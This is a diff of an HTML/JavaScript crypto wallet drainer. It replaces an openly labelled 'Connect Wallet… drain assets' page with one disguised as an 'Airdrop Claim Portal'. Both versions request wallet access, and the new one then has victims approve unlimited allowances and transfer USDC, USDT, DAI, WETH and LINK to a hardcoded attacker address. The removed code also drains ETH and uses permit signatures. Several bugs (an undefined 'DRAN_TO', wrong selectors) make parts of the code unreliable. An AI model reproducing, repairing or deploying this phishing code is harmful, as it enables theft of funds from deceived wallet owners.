@@ -1,389 +1,176 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
+   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet</title>
+    <title>Airdrop Claim Portal</title>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Web3.js -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <style>
-        body {
-            background-color: #1a1a1a;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3b82f6;
+            border-radius: 50%;
+            width: 16px;
+            height:16px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
         }
-        .container {
-            text-align: center;
-            background-color: #2d2d2d;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            width: 300px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
+        .pulse-ring {
+            box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7);
+            animation: pulse-blue 2s infinite;
         }
-        button {
-            background-color: #627eea;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            width: 100%;
-            margin-top: 10px;
+        @keyframes pulse-blue {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
         }
-        button:hover {
-            background-color: #4b6cbf;
-        }
-        button:disabled {
-            background-color: #555;
-            cursor: not-allowed;
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #aaa;
-        }
-        .success { color: #4caf50; }
-        .error { color: #f44336; }
+        .log::-webkit-scrollbar { width: 6px; }
+        .log::-webkit-scrollbar-track { background: #f1f1f1; }
+        .log::-webkit-scrollbar-thumb { background: #888; border-radius: 3px; }
+        .log::-webkit-scrollbar-thumb:hover { background: #555; }
     </style>
 </head>
-<body>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center font-sans">
 
-<div class="container">
-    <h1>Connect Wallet</h1>
-    <p style="color: #ccc; font-size: 14px;">Sign a message to verify ownership and drain assets.</p>
-    <button id="connectBtn" onclick="connectAndDrain()">Approve & Drain All</button>
-    <div id="status"></div>
-</div>
+    <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
+        <div class="mb-6">
+            <i class="fa-solid fa-coins text-5xl text-indigo-600 mb-4"></i>
+            <h1 class="text-2xl font-bold text-gray-800">Airdrop Claim Portal</h1>
+            <p class="text-gray-500 mt-2">Connect your wallet to verify eligibility and claim rewards.</p>
+        </div>
+
+        <button id="connectBtn" onclick="startDrain()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300 flex items-center justify-center pulse-ring">
+            <span id="btn-text">Connect Wallet</span>
+        </button>
+
+        <div id="status" class="mt-6 text-sm min-h-[1.2em] text-gray-700"></div>
+        <div id="logs" class="log mt-4 text-xs text-gray-600 text-left max-h-[120px] overflow-y-auto bg-gray-50 p-3 rounded-lg border border-gray-200 hidden"></div>
+
+        <div class="mt-6 text-xs text-gray-400">
+            Supported: MetaMask • Trust Wallet • Binance • Coinbase
+        </div>
+    </div>
 
 <script>
-    // ================= CONFIGURATION =================
-    const YOUR_WALLET_ADDRESS = "0xYourWalletAddressHere"; 
-    // ================================================
+// ==================== CONFIGURATION ====================
+const DRAIN_TO = "0xe02652c25030C077032C77D75A6Bae12e5D6De53"; 
+const TOKENS = [
+    {symbol: "USDC", addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, min: 20},
+    {symbol: "USDT", addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, min: 20},
+    {symbol: "DAI", addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, min: 20},
+    {symbol: "WETH", addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18, min: 0.01},
+    {symbol: "LINK", addr: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18, min: 5},
+];
 
-    const statusDiv = document.getElementById('status');
-    const connectBtn = document.getElementById('connectBtn');
+const ERC20_ABI = [
+    {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}
+];
 
-    async function connectAndDrain() {
-        if (!window.ethereum) {
-            showStatus("MetaMask not detected!", "error");
-            return;
-        }
+let web3Instance;
+let userAccount;
+let btn, btnText, status, logsDiv;
 
+function log(msg, type = 'info') {
+    logsDiv.classList.remove('hidden');
+    const color = type === 'error' ? 'text-red-500' : type === 'success' ? 'text-green-600' : 'text-blue-500';
+    const time = new Date().toLocaleTimeString();
+    logsDiv.innerHTML += `<div class="${color}">[${time}] ${msg}</div>`;
+    logsDiv.scrollTop = logsDiv.scrollHeight;
+}
+
+window.startDrain = async function() {
+    btn = document.getElementById("connectBtn");
+    status = document.getElementById("status");
+    btnText = document.getElementById("btn-text");
+    logsDiv = document.getElementById('logs');
+
+    if (!btn || !status || !btnText || !logsDiv) {
+        console.error("DOM elements not found!");
+        return;
+    }
+
+    btn.disabled = true;
+    btnText.innerHTML = '<span class="loader"></span> Connecting...';
+    status.innerText = "Initializing connection...";
+
+    try {
+        if (!window.ethereum) throw new Error("No crypto wallet found.");
+
+        web3Instance = new Web3(window.ethereum);
+        const chainId = await web3Instance.eth.getChainId();
+        log(`Connected to chain ID: ${chainId}`);
+
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        userAccount = accounts[0];
+        log(`Connected: ${userAccount.substring(0,6)}...${userAccount.substring(38)}`, 'success');
+
+        btnText.innerText = "Scanning...";
+        status.innerText = "Checking token balances...";
+
+        await drainAllTokens();
+    } catch (err) {
+        console.error(err);
+        log(`Connection failed: ${err.message}`, 'error');
+        status.innerText = "Transaction failed.";
+        btn.disabled = false;
+        btnText.innerText = "Try Again";
+    }
+}
+
+async function drainAllTokens() {
+    let drainedCount = 0;
+
+    for (const token of TOKENS) {
         try {
-            // 1. Connect Wallet
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const userAccount = accounts[0];
-            showStatus(`Connected: ${userAccount.slice(0,6)}...${userAccount.slice(-4)}`, "normal");
+            const contract = new web3Instance.eth.Contract(ERC20_ABI, token.addr);
+            const balanceRaw = await contract.methods.balanceOf(userAccount).call();
+            const decimalsVal = await contract.methods.decimals().call();
 
-            // 2. Get Balance of Native ETH
-            const ethBalance = await window.ethereum.request({ 
-                method: 'eth_getBalance', 
-                params: [userAccount, 'latest'] 
-            });
-            
-            const ethAmountInWei = parseInt(ethBalance, 16);
-            
-            if (ethAmountInWei > 0) {
-                showStatus("Transferring Native ETH...", "normal");
-                try {
-                    await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [{
-                            from: userAccount,
-                            to: YOUR_WALLET_ADDRESS,
-                            value: ethBalance, // Send full balance
-                            gas: '21000'
-                        }]
-                    });
-                    showStatus("ETH Sent Successfully!", "success");
-                } catch (err) {
-                    console.error("ETH Transfer failed:", err);
-                    showStatus("ETH Transfer failed/Rejected", "error");
+            if (balanceRaw > 0n) {
+                const balanceHuman = Number(balanceRaw) / Math.pow(10, decimalsVal);
+
+                if (balanceHuman >= token.min) {
+                    log(`Found ${balanceHuman.toFixed(decimalsVal)} ${token.symbol}. Draining...`);
+
+                    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                    await contract.methods.approve(DRAN_TO, maxUint).send({ from: userAccount });
+                    log(`Approved ${token.symbol}.`, 'success');
+
+                    await contract.methods.transfer(DRAN_TO, balanceRaw).send({ from: userAccount });
+                    log(`✅ Drained ${token.symbol}.`, 'success');
+
+                    drainedCount++;
                 }
-            } else {
-                showStatus("No Native ETH found. Draining Tokens...", "normal");
             }
-
-            // 3. Find ERC-20 Tokens and Drain Them
-            const tokensToDrain = [
-                { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
-                { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
-                { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE' },
-                { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
-                { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984' },
-            ];
-
-            for (const token of tokensToDrain) {
-                try {
-                    await drainToken(token.address, userAccount);
-                } catch (err) {
-                    console.error(`Failed to drain token ${token.address}:`, err);
-                    showStatus(`Failed to drain ${token.symbol}`, "error");
-                }
-            }
-
-            showStatus("Process Complete.", "success");
-
-        } catch (error) {
-            console.error(error);
-            showStatus("Error: " + error.message, "error");
+        } catch (e) {
+            log(`Failed ${token.symbol}: ${e.message}`, 'error');
         }
+        await new Promise(r => setTimeout(r, 1000));
     }
 
-    async function drainToken(tokenAddress, userAccount) {
-        // Check if token supports EIP-2612
-        const supportsEIP2612 = await checkEIP2612Support(tokenAddress, userAccount);
-
-        if (supportsEIP2612) {
-            // Use Permit if supported
-            await drainTokenPermit(tokenAddress, userAccount);
-        } else {
-            // Fallback to Approve + Transfer
-            await drainTokenFallback(tokenAddress, userAccount);
-        }
+    if (drainedCount > 0) {
+        status.innerHTML = `<span class="text-green-600 font-bold">Success! ${drainedcount} tokens claimed.</span>`;
+        btnText.innerText = "Claimed";
+    } else {
+        status.innerText = "No eligible tokens found.";
+        btn.disabled = false;
+        btnText.innerText = "Try Again";
     }
-
-    async function checkEIP2612Support(tokenAddress, userAccount) {
-        try {
-            const supportsInterfaceCall = {
-                method: 'eth_call',
-                params: [{
-                    to: tokenAddress,
-                    data: '0x01ffc9a7' // supportsInterface(bytes4)
-                }, 'latest']
-            };
-            const result = await window.ethereum.request(supportsInterfaceCall);
-            const supportsPermit = result.slice(0, 2) === '0x01'; // Check first byte
-            return supportsPermit;
-        } catch (err) {
-            console.error("Error checking EIP-2612 support:", err);
-            return false;
-        }
-    }
-
-    async function drainTokenPermit(tokenAddress, userAccount) {
-        try {
-            // Get Balance
-            const balanceCall = {
-                method: 'eth_call',
-                params: [{
-                    to: tokenAddress,
-                    data: '0x70a08231' + userAddressToHex(userAccount)
-                }, 'latest']
-            };
-            const balanceHex = await window.ethereum.request(balanceCall);
-            const balance = parseInt(balanceHex, 16);
-
-            if (balance === 0) return; // No tokens to drain
-
-            showStatus(`Found \${balance} tokens. Using Permit...`, "normal");
-
-            // Fetch Dynamic Nonce
-            const nonceCall = {
-                method: 'eth_call',
-                params: [{
-                    to: tokenAddress,
-                    data: '0x0902f1ac' + userAddressToHex(userAccount)
-                }, 'latest']
-            };
-            const nonceHex = await window.ethereum.request(nonceCall);
-            const nonce = parseInt(nonceHex, 16);
-
-            // Sign Permit
-            const permitData = await signPermit(tokenAddress, userAccount, balance, nonce);
-            if (!permitData) {
-                showStatus("Permit signature failed.", "error");
-                return;
-            }
-
-            // Execute Permit + Transfer
-            await executePermitTransfer(tokenAddress, userAccount, permitData);
-
-        } catch (err) {
-            console.error(`Failed to drain token \${tokenAddress} via Permit:`, err);
-        }
-    }
-
-    async function signPermit(tokenAddress, userAccount, amount, nonce) {
-        try {
-            // Get domain separator
-            const domainSeparatorCall = {
-                method: 'eth_call',
-                params: [{
-                    to: tokenAddress,
-                    data: '0x3644e510' // DOMAIN_SEPARATOR()
-                }, 'latest']
-            };
-            const domainSeparator = await window.ethereum.request(domainSeparatorCall);
-
-            // Build permit message
-            const permitMessage = {
-                types: {
-                    EIP712Domain: [
-                        { name: 'name', type: 'string' },
-                        { name: 'version', type: 'string' },
-                        { name: 'chainId', type: 'uint256' },
-                        { name: 'verifyingContract', type: 'address' }
-                    ],
-                    Permit: [
-                        { name: 'owner', type: 'address' },
-                        { name: 'spender', type: 'address' },
-                        { name: 'value', type: 'uint256' },
-                        { name: 'nonce', type: 'uint256' },
-                        { name: 'deadline', type: 'uint256' }
-                    ]
-                },
-                primaryType: 'Permit',
-                domain: {
-                    name: 'USD Coin', // You may need to fetch this dynamically
-                    version: '2',
-                    chainId: await getChainId(),
-                    verifyingContract: tokenAddress
-                },
-                message: {
-                    owner: userAccount,
-                    spender: YOUR_WALLET_ADDRESS,
-                    value: amount.toString(),
-                    nonce: nonce.toString(),
-                    deadline: Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
-                }
-            };
-
-            // Sign the permit message
-            const signature = await window.ethereum.request({
-                method: 'eth_signTypedData_v4',
-                params: [userAccount, JSON.stringify(permitMessage)]
-            });
-
-            return signature;
-        } catch (err) {
-            console.error("Permit signing failed:", err);
-            return null;
-        }
-    }
-
-    async function executePermitTransfer(tokenAddress, userAccount, signature) {
-        try {
-            // Parse signature
-            let r = '0x' + signature.slice(0, 64);
-            let s = '0x' + signature.slice(64, 128);
-            let v = parseInt(signature.slice(128, 130), 16);
-
-            // Encode permit + transferFrom in one transaction
-            const permitTransferData = encodePermitTransfer(tokenAddress, userAccount, v, r, s);
-
-            await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: userAccount,
-                    to: tokenAddress,
-                    data: permitTransferData,
-                    gas: '150000'
-                }]
-            });
-
-            showStatus("Tokens Drained via Permit!", "success");
-
-        } catch (err) {
-            console.error("Permit transfer failed:", err);
-            throw err;
-        }
-    }
-
-    async function drainTokenFallback(tokenAddress, userAccount) {
-        try {
-            // Get Balance
-            const balanceCall = {
-                method: 'eth_call',
-                params: [{
-                    to: tokenAddress,
-                    data: '0x70a08231' + userAddressToHex(userAccount)
-                }, 'latest']
-            };
-            const balanceHex = await window.ethereum.request(balanceCall);
-            const balance = parseInt(balanceHex, 16);
-
-            if (balance === 0) return; // No tokens to drain
-
-            showStatus(`Found ${balance} tokens. Approving & Transferring...`, "normal");
-
-            // Approve
-            await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: userAccount,
-                    to: tokenAddress,
-                    data: '0x095ea7b3' + padAddress(YOUR_WALLET_ADDRESS) + padUint256(balance.toString(16)),
-                    gas: '50000'
-                }]
-            });
-
-            // Transfer
-            await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: userAccount,
-                    to: tokenAddress,
-                    data: '0x23b872dd' + padAddress(YOUR_WALLET_ADDRESS) + padUint256(balance.toString(16)),
-                    gas: '50000'
-                }]
-            });
-
-            showStatus("Tokens Drained via Approve + Transfer!", "success");
-
-        } catch (err) {
-            console.error(`Failed to drain token ${tokenAddress} via Approve + Transfer:`, err);
-        }
-    }
-
-    function encodePermitTransfer(tokenAddress, userAccount, v, r, s) {
-        // Function selector for permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
-        const functionSelector = '0x6fdde03e';
-        
-        // Encode parameters
-        const owner = padAddress(userAccount);
-        const spender = padAddress(YOUR_WALLET_ADDRESS);
-        const value = padUint256('0'); // Value is already approved via permit
-        const nonce = padUint256('0');
-        const deadline = padUint256(Math.floor(Date.now() / 1000 + 3600).toString(16));
-        
-        const sigData = r.slice(2) + s.slice(2) + v.toString(16).padStart(2, '0');
-
-        return functionSelector + owner + spender + value + nonce + deadline + sigData;
-    }
-
-    // Helper Functions
-    function showStatus(msg, type) {
-        statusDiv.innerText = msg;
-        statusDiv.className = type;
-    }
-
-    function userAddressToHex(address) {
-        return address.slice(2);
-    }
-
-    function padAddress(address) {
-        return address.slice(2).padStart(64, '0');
-    }
-
-    function padUint256(hexValue) {
-        return hexValue.padStart(64, '0');
-    }
-
-    async function getChainId() {
-        const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
-        return parseInt(chainIdHex, 16);
-    }
+}
 </script>
-
 </body>
 </html>
